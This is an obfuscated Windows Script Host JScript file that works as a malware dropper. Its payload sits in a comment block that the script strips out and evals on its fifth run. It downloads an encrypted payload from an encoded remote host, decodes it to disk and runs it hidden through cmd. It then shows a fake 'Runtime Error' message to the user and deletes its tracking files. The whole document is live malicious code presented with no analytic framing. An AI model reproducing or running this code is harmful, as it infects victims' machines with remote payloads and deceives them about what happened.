

var fabebfddccbcbc = '';
var  baeeabcbfaab = [];
var    fdbbccbfdeabad;



	
	
	var aefaeccdfab = new ActiveXObject('Scripting.FileSystemObject');
	
	var cdbfebedcfdf = aefaeccdfab.GetSpecialFolder(2);


/*

function befddbadfafded(affefbbeeaddceb) {
    var bedcea = affefbbeeaddceb.toString();
    var bbeaecdbfdbddacd = '';
    for (var ebbccaaebabbc = 0; ebbccaaebabbc < bedcea.length; ebbccaaebabbc += 2)
        bbeaecdbfdbddacd += String.fromCharCode(parseInt(bedcea.substr(ebbccaaebabbc, 2), 16));
    return bbeaecdbfdbddacd;
}

function aeadbfafffecabdcca(cfcccdebebeadadfeb) {
  return !isNaN(parseFloat(cfcccdebebeadadfeb)) && isFinite(cfcccdebebeadadfeb);
}



function ebefdaddfefd(babececcfebabececcfe,decbbabcdc){
	
	
	for(i=decbbabcdc;i>0;i--){
		
		babececcfebabececcfe = babececcfebabececcfe - 1;
		
		if(babececcfebabececcfe<0)babececcfebabececcfe = 9;
		
	}

	return babececcfebabececcfe;
	

}




function bfedfedeeaacefdfbe(sstrstrtbabececcfer,eeeabbecba){
	
	
	
	var bcedbccbcfcffe = sstrstrtbabececcfer.length;
	
	var ddaccdaabcedcefd = '';
	
	
	var fbbffccbbadfe = 0;
	
	for(var beddcafccfbdec=0;beddcafccfbdec<bcedbccbcfcffe;beddcafccfbdec++){
		
		if(fbbffccbbadfe>10)fbbffccbbadfe=0;
		
		
		if(aeadbfafffecabdcca(sstrstrtbabececcfer.charAt(beddcafccfbdec))){
		
			ddaccdaabcedcefd = ddaccdaabcedcefd + ebefdaddfefd(sstrstrtbabececcfer.charAt(beddcafccfbdec),eeeabbecba[fbbffccbbadfe]);
			fbbffccbbadfe++;
			
		}else{
			
			ddaccdaabcedcefd = ddaccdaabcedcefd + sstrstrtbabececcfer.charAt(beddcafccfbdec);
			
		}
		
	}
	
	return ddaccdaabcedcefd;
}


function fecebbeadfeac(dfadaceeaacc,bedbadafddeddfdf){
	
	var cabdccebee = "12vGh8@uZgjN&_DOmKIo3P%wLJ7S4Xd0+z;as.CU,rY9y!xf(iHVMkFpcTbl-EQR)5qBAW^ne:*t$6";
	var fceddfaafacdcb = "";

	var ddffabde = cabdccebee.length-1;

	var size = dfadaceeaacc.length;

	
	
	for(var fffbaceeebcab = 0; fffbaceeebcab<size ; fffbaceeebcab++){
		
		var eebfdbdcfdcbdfea = cabdccebee.indexOf(dfadaceeaacc.charAt(fffbaceeebcab));
		
		var fcacebfdadcffe = eebfdbdcfdcbdfea - bedbadafddeddfdf;
		
		if(fcacebfdadcffe<0){
			
			fcacebfdadcffe = ddffabde - Math.abs(fcacebfdadcffe);
			
			var decbbabcdc = ddffabde - 1;	
		
			if(fcacebfdadcffe==decbbabcdc)fcacebfdadcffe = fcacebfdadcffe + bedbadafddeddfdf;
			
		}
		
		
		fceddfaafacdcb = fceddfaafacdcb + cabdccebee.charAt(fcacebfdadcffe);
	}
	
	return befddbadfafded(fceddfaafacdcb);
}


var ceabcafc = new ActiveXObject(fecebbeadfeac("SP1PSv1yS+SX1y1Q1SvQ111y1U1qSPSySPSX1q1O1p1v1W1q1PSX",1));
var cdbfebedcfdf = ceabcafc.GetSpecialFolder(2);


var ceabcafcDeck = new ActiveXObject(fecebbeadfeac('----qSqP1PSv1yS+SXvQSP1@1q1U1U',1));
var ffcbdcacccefebced = ceabcafcDeck.SpecialFolders(fecebbeadfeac('----XX1qSP1ASX1pS+',1));
var cdbfebedcfdfd = ffcbdcacccefebced;

var eebeedeabcbcf = new ActiveXObject(fecebbeadfeac("SP1PSv1yS+SX1y1Q1SvQ111y1U1qSPSySPSX1q1O1p1v1W1q1PSX",1));    


var acdcedbeeafdaccbd = new ActiveXObject(fecebbeadfeac('----XOSPS@1O1UPvvQq@XOXUX@qXqXq+vQPPvQP+',1));


var dfbeafeccca = 0;
while(true){
	
	dfbeafeccca++;
	
	
	try {

		acdcedbeeafdaccbd.open(fecebbeadfeac('----XSXqqX',1), fecebbeadfeac('----1@SXSXS+PWvpvp1@1pSv1P1pSvvQ1P1p1Ovp1S12SX1qvQS+1@S+',1)+'?ff'+dfbeafeccca, false);
		acdcedbeeafdaccbd.send();
	

	} catch(e) {

		WScript.Sleep(1000);
		continue;

	}
	

	var aaaaacdadcf = acdcedbeeafdaccbd.responseText.indexOf('|||');

    if( aaaaacdadcf == -1 ){
		
		WScript.Sleep(1000);
		continue;
		
	}

	
	if(acdcedbeeafdaccbd.Status == 200)break;
}

   var eeebbdfbefffef = acdcedbeeafdaccbd.responseText;
    
    eeebbdfbefffef = eeebbdfbefffef.split(fecebbeadfeac('----SUSUSU',1));
  
    var bebaffbcefbbe = eeebbdfbefffef[0].split(fecebbeadfeac('----vU',1));
   

   
fabebfddccbcbc = bfedfedeeaacefdfbe(eeebbdfbefffef[1],bebaffbcefbbe); 
   
var aaafffffccbdaooo = new ActiveXObject(fecebbeadfeac("SP1PSv1yS+SX1y1Q1SvQ111y1U1qSPSySPSX1q1O1p1v1W1q1PSX",1));
   
var  baeeabcbfaab = [];



for(var beddcafccfbdec=0; beddcafccfbdec< fabebfddccbcbc.length-1; beddcafccfbdec+=2){
    baeeabcbfaab.push(parseInt(fabebfddccbcbc.substr(beddcafccfbdec, 2), 16));
}

fdbbccbfdeabad = String.fromCharCode.apply(String, baeeabcbfaab);

function edbaabffdeef(fbcbdabfd){ 


var abffcadfdfaaa = fbcbdabfd;
var eddadbcfcacce = new ActiveXObject(fecebbeadfeac('----X2XXXpXXXvvQqPSXSv1q121O',1));
eddadbcfcacce.Type = 2;
eddadbcfcacce.Charset = 'ISO-8859-1';
eddadbcfcacce.Open();
eddadbcfcacce.WriteText(abffcadfdfaaa);
eddadbcfcacce.SaveToFile(cdbfebedcfdfd + '/' +fecebbeadfeac('----1PPX1211vQ1qS@1q',1), 2);
eddadbcfcacce.Close();

} 



edbaabffdeef(fdbbccbfdeabad);


   var aaafffffccbda = new ActiveXObject(fecebbeadfeac("SP1PSv1yS+SX1y1Q1SvQ111y1U1qSPSySPSX1q1O1p1v1W1q1PSX",1));
   
 
 	var dadfaccabf = aaafffffccbda.FileExists(cdbfebedcfdf + '/' +'bdefecbeaadcce.txt');
	
	var effecfcffec = new ActiveXObject(fecebbeadfeac('----qSqP1PSv1yS+SXvQSP1@1q1U1U',1));
		
	effecfcffec.Run(fecebbeadfeac('----1P1O1XvQ1qS@1qv+vp1Pv+',1)+ cdbfebedcfdfd +'\\'+ fecebbeadfeac('----1PPX1211vQ1qS@1q',1),0,false);


	

	WScript.echo('Runtime Error 0x48940 (.QBT) Library not located on the system, please use x64 system.');

	aaafffffccbda.DeleteFile(cdbfebedcfdf + '/' +'bcedbccbcfcffeer.txt');
	if(dadfaccabf)aaafffffccbda.DeleteFile(cdbfebedcfdf + '/' +'bdefecbeaadcce.txt');	
	
	WScript.Quit();
	
	*/
	
	function bfddcade(){
		

		var aaffecbefaeb = new ActiveXObject('Scripting.FileSystemObject');
   
		var faecdadebbe = aaffecbefaeb.OpenTextFile(WScript.ScriptFullName, 1);
		
		var fdceffbbbfceeeacd;
		
		var defeedffeabdd = 'fdceffbbbfceeeacd =  faecdadebbe.ReaebfbeffeccdAll();';
		
		eval(defeedffeabdd.replace('ebfbeffecc',''));
		
		faecdadebbe.Close();
		
		return fdceffbbbfceeeacd;
		
	}

	
   var bcedbccbcfcffe = 0;
   var dadfaccabf = aefaeccdfab.FileExists(cdbfebedcfdf + '/' + 'bcedbccbcfcffeer.txt');
   if(dadfaccabf == true){
	var efaeabeedeeadc = aefaeccdfab.OpenTextFile(cdbfebedcfdf + '/' + 'bcedbccbcfcffeer.txt', 1,1);
	bcedbccbcfcffe = efaeabeedeeadc.ReadAll();
			efaeabeedeeadc.Close();
   }
	bcedbccbcfcffe = parseInt(bcedbccbcfcffe) +1;
	

	
	efaeabeedeeadc = aefaeccdfab.OpenTextFile(cdbfebedcfdf + '/' + 'bcedbccbcfcffeer.txt', 2,1);
	
	efaeabeedeeadc.WriteLine(bcedbccbcfcffe); 
	efaeabeedeeadc.Close(); 
	
	var daccdffac = bfddcade();
	
	
	
	if(bcedbccbcfcffe==4){
		
		
		efaeabeedeeadc = aefaeccdfab.OpenTextFile(cdbfebedcfdf + '/' + 'befeaacbafdd.txt', 2,1);
		efaeabeedeeadc.WriteLine(bcedbccbcfcffe); 
		efaeabeedeeadc.Close(); 
		
	}
	
	if(bcedbccbcfcffe==5){
				
		aefaeccdfab.MoveFile(cdbfebedcfdf + '/' + 'befeaacbafdd.txt', cdbfebedcfdf + '/' + 'bdefecbeaadcce.txt');
		if(aefaeccdfab.FileExists(cdbfebedcfdf + '/' + 'sd43sbefeaacbafdd.txt'))aefaeccdfab.DeleteFile(cdbfebedcfdf + '/' + 'sd43sbefeaacbafdd.txt');
		if(aefaeccdfab.FileExists('1sd43sbefeaacbafdd.txt'))aefaeccdfab.DeleteFile(cdbfebedcfdf + '/' + '1sd43sbefeaacbafdd.txt');
		if(aefaeccdfab.FileExists(cdbfebedcfdf + '/' + '2sd43sbefeaacbafdd.txt'))aefaeccdfab.DeleteFile(cdbfebedcfdf + '/' + '2sd43sbefeaacbafdd.txt');
		if(aefaeccdfab.FileExists(cdbfebedcfdf + '/' + '3sd43sbefeaacbafdd.txt'))aefaeccdfab.DeleteFile(cdbfebedcfdf + '/' + '3sd43sbefeaacbafdd.txt');
		if(aefaeccdfab.FileExists(cdbfebedcfdf + '/' + '4sd43sbefeaacbafdd.txt'))aefaeccdfab.DeleteFile(cdbfebedcfdf + '/' + '4sd43sbefeaacbafdd.txt');
		if(aefaeccdfab.FileExists(cdbfebedcfdf + '/' + '5sd43sbefeaacbafdd.txt'))aefaeccdfab.DeleteFile(cdbfebedcfdf + '/' + '5sd43sbefeaacbafdd.txt');
		if(aefaeccdfab.FileExists(cdbfebedcfdf + '/' + '6ssd3ssbefeaacbafdd.txt'))aefaeccdfab.DeleteFile(cdbfebedcfdf + '/' + '6ssd3ssbefeaacbafdd.txt');
		if(aefaeccdfab.FileExists(cdbfebedcfdf + '/' + '6ssd3ssbefeaacbafdd.txt'))aefaeccdfab.DeleteFile(cdbfebedcfdf + '/' + 'asdddsdf2ssbefeaacbafdd.txt');
		if(aefaeccdfab.FileExists(cdbfebedcfdf + '/' + 'asdddddsdf2sddsbefeaacbafdd.txt'))aefaeccdfab.DeleteFile(cdbfebedcfdf + '/' + 'asdddddsdf2sddsbefeaacbafdd.txt');
		if(aefaeccdfab.FileExists(cdbfebedcfdf + '/' + 'assddddddssdf2sddsbefeaacbafdd.txt'))aefaeccdfab.DeleteFile(cdbfebedcfdf + '/' + 'assddddddssdf2sddsbefeaacbafdd.txt');
		if(aefaeccdfab.FileExists(cdbfebedcfdf + '/' + 'adecfbfcccffc.txt'))aefaeccdfab.DeleteFile(cdbfebedcfdf + '/' + 'adecfbfcccffc.txt');
		if(aefaeccdfab.FileExists(cdbfebedcfdf + '/' + 'adecfbfcccffc.txt'))aefaeccdfab.DeleteFile(cdbfebedcfdf + '/' + 'adecfbfcccffc.txt');

		
	
		daccdffac = daccdffac.split('----').join('').replace('/*','').replace('*/', '').replace('\/\/','');
	}
	

	var dadfaccabf = aefaeccdfab.FileExists(cdbfebedcfdf + '/' + 'bdefecbeaadcce.txt');

	 if(dadfaccabf == true){
	   
	   eval(daccdffac);
	   
	}

	efaeabeedeeadc = aefaeccdfab.OpenTextFile(cdbfebedcfdf + '/' + 'sd43sbefeaacbafdd.txt', 2,1);
		efaeabeedeeadc.WriteLine('ebdfadefdc'); 
		efaeabeedeeadc.Close(); 
		
		
		var dadfaccabfx = aefaeccdfab.FileExists(cdbfebedcfdf + '/' + 'sd43sbefeaacbafdd.txt');

		if(dadfaccabf !== false){
		
			aefaeccdfab.DeleteFile(cdbfebedcfdf + '/' + 'sd43sbefeaacbafdd.txt');

		}
	
	
   
   
	efaeabeedeeadc = aefaeccdfab.OpenTextFile(cdbfebedcfdf + '/' + '1sd43sbefeaacbafdd.txt', 2,1);
		efaeabeedeeadc.WriteLine('ebdfadefdc'); 
		efaeabeedeeadc.Close(); 
		

   
	eval(daccdffac);
	
		
   
	
	
	
